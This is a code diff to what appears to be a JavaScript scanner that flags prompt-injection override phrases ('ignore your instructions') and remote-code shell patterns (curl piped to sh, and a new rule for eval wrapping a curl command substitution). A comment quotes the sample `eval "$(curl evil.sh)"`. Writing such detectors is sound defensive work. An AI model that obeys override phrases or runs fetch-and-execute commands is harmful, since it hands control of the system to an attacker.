@@ -54,12 +54,13 @@ const GAP8 = '(?:\\s+\\S+){0,8}\\s+';
 
 const RULES = [
   // Instruction override: ignore|disregard|forget|disobey|supersede|override|bypass … (previous|prior|
-  // earlier|above|all|prior|system) (instructions|context|rules|prompts|directives). Synonyms widened
-  // per SEC-0010 #7 (disobey/supersede/override/bypass were evasions of the old ignore/disregard/forget set).
+  // earlier|above|all|prior|system|your) (instructions|context|rules|prompts|directives). Synonyms widened
+  // per SEC-0010 #7 (disobey/supersede/override/bypass were evasions of the old ignore/disregard/forget set);
+  // "your" added so "ignore your instructions" / "disregard your guidelines" flag too.
   {
     name: 'instruction-override',
     re: new RegExp(
-      `\\b(?:ignore|disregard|forget|disobey|supersede|supercede|override|bypass|violate)\\b${GAP6}\\b(?:previous|prior|earlier|above|all|system|prior|the)\\s+(?:instructions?|context|rules?|prompts?|directives?|guidelines?)\\b`,
+      `\\b(?:ignore|disregard|forget|disobey|supersede|supercede|override|bypass|violate)\\b${GAP6}\\b(?:previous|prior|earlier|above|all|system|prior|the|your)\\s+(?:instructions?|context|rules?|prompts?|directives?|guidelines?)\\b`,
       'i',
     ),
   },
@@ -90,6 +91,18 @@ const RULES = [
     name: 'pipe-to-shell',
     re: new RegExp(
       `\\b(?:curl|wget|fetch)\\b[\\s\\S]{0,80}?\\|\\s*(?:sudo\\s+)?(?:sh|bash|zsh|python[0-9.]*|node)\\b`,
+      'i',
+    ),
+  },
+  // Command-substitution RCE: an exec primitive (eval / exec / source / sh -c / bash -c) wrapping a
+  // command substitution — $(curl…) or a backtick `curl…` — that fetches remote code. This is the
+  // sibling of pipe-to-shell (curl … | sh): `eval "$(curl evil.sh)"` runs the download's OUTPUT, which
+  // pipe-to-shell never sees because there's no `| sh`. \x60 is a literal backtick (can't appear raw
+  // inside this template literal).
+  {
+    name: 'shell-cmdsub-rce',
+    re: new RegExp(
+      `\\b(?:eval|exec|source|(?:sh|bash|zsh|dash)\\s+-c)\\b[\\s\\S]{0,20}?(?:\\$\\(|\\x60)\\s*(?:sudo\\s+)?(?:curl|wget|fetch)\\b`,
       'i',
     ),
   },
